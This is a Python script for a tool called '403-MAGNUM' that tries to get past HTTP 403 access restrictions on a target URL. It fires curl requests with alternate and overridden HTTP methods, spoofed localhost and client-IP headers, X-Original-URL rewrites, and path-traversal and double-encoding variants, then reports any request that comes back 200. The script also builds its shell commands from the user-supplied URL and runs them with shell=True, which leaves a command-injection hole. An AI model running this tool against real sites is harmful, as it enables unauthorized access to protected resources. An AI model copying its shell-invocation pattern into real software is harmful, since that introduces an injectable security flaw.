import subprocess
from typing import Optional
from urllib.parse import urlparse
import pyfiglet
import optparse


banner = pyfiglet.figlet_format("403-MAGNUM", font="slant")
border = "=" * 70
print(f"\033[91m{border}")  
print(f"\033[93m{banner}")  
print("\033[94m[*] A powerful tool for bypassing 403 Forbidden responses")
print("\033[92m[*] ####################### Created by: 54nj4y") 
print(f"\033[91m{border}\033[0m\n")  


def parse_url_safely(url: str) -> dict:
    """Safely parse URL and extract components"""
    try:
        parsed = urlparse(url)
        result = {
            'path': parsed.path,
            'file': parsed.path.split('/')[-1] if parsed.path != '/' else ''
        }
        return result
    except Exception as e:
        logging.error(f"Error parsing URL {url}: {e}")
        return {'path': '/', 'file': ''}

def process_request(val: str) -> Optional[str]:
    try:
        result = subprocess.run(
            val, 
            shell=True, 
            capture_output=True,
            timeout=2, 
            text=True,
            check=False  
        )
        return result.stdout
    except:  
        return None

def perform_method_fuzzing(url: str):
    """Test different HTTP methods"""
    methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE', 'PATCH', 'INVENTED']
    for method in methods:
        val = f'curl -k -o /tmp -m 5 -s -L -w "%{{http_code}}" -X {method} "{url}"'
        process(val)
        
        override_headers = [
            f'-H "X-HTTP-Method-Override: {method}"',
            f'-H "X-Method-Override: {method}"',
            f'-H "X-Original-Method: {method}"'
        ]
        for header in override_headers:
            val = f'curl -k -o /tmp -m 5 -s -L -w "%{{http_code}}" {header} "{url}"'
            process(val)

def perform_header_fuzzing(url: str):
    """Test various HTTP headers"""
    headers = {
        'X-Forwarded-For': '127.0.0.1',
        'X-Forwarded-Host': 'localhost',
        'X-Host': 'localhost',
        'X-Original-URL': url,
        'X-Rewrite-URL': url,
        'X-Custom-IP-Authorization': '127.0.0.1',
        'X-Originating-IP': '127.0.0.1',
        'X-Remote-IP': '127.0.0.1',
        'X-Client-IP': '127.0.0.1',
        'X-Real-IP': '127.0.0.1'
    }
    
    for header, value in headers.items():
        val = f'curl -k -o /tmp -m 5 -s -L -w "%{{http_code}}" -H "{header}: {value}" "{url}"'
        process(val)

def perform_url_fuzzing(url: str, url_info: dict):
    """Test URL path variations"""
    site = url.replace(url_info['file'], '')
    variations = [
        f"{site}//{url_info['file']}",
        f"{site}/./{url_info['file']}",
        f"{site}/./{url_info['file']}/.",
        f"{site}/%2e/{url_info['file']}",
        f"{site}/%252e/{url_info['file']}",
        f"{site}/ANYTHING/{url_info['file']}",
        f"{site}/../{url_info['file']}",
        f"{site}/..;/{url_info['file']}",
        f"{site}/;/{url_info['file']}"
    ]
    
    for variant in variations:
        val = f'curl -k -o /tmp -m 5 -s -L -w "%{{http_code}}" "{variant}"'
        process(val)

def perform_extra_fuzzing(url: str):
    """Additional fuzzing techniques"""
    extras = [
        f'curl -k -o /tmp -m 5 -s -L -w "%{{http_code}}" -H "Content-Length: 0" "{url}"',
        f'curl -k -o /tmp -m 5 -s -L -w "%{{http_code}}" -H "Host: localhost" "{url}"',
        f'curl -k -o /tmp -m 5 -s -L -w "%{{http_code}}" --path-as-is "{url}"',
        f'curl -k -o /tmp -m 5 -s -L -w "%{{http_code}}" -H "Referer: {url}" "{url}"',
        f'curl -k -o /tmp -m 5 -s -L -w "%{{http_code}}" -H "X-Original-URL: /" "{url}"'
    ]
    
    for command in extras:
        process(command)

def main():

    usage = "usage: 403-Magnum.py [options] url\n\n      Eg: python 403-Magnum.py -v -u https://website.com/403.log"
    parser = optparse.OptionParser(usage=usage)
    
    parser.add_option("-v", "--verbose", action='store_true', dest='value1', help="Shows all responses")
    parser.add_option("-u", "--url", dest='url', help="Url of website")

    (options, args) = parser.parse_args()

    if not options.url:
        parser.print_help()
        exit(0)
    
    global verbose
    verbose = options.value1  
        
    url = options.url
    url_info = parse_url_safely(url)
    
    print("Starting 403 bypass attempts...")
    
    # 1. Method Fuzzing
    print("Testing HTTP Methods...")
    perform_method_fuzzing(url)
    
    # 2. Header Fuzzing
    print("Testing HTTP Headers...")
    perform_header_fuzzing(url)
    
    # 3. URL Path Fuzzing
    print("Testing URL Path variations...")
    perform_url_fuzzing(url, url_info)
    
    # 4. Extra Techniques
    print("Testing additional bypass techniques...")
    perform_extra_fuzzing(url)


def process(val):
    code = process_request(val)
    if code:
        if '200' in code:
            print('\033[92m' + f'===>{code} {val}' + '\033[0m')
        elif verbose:
            print(f'{code} {val}')

if __name__ == "__main__":
    main()
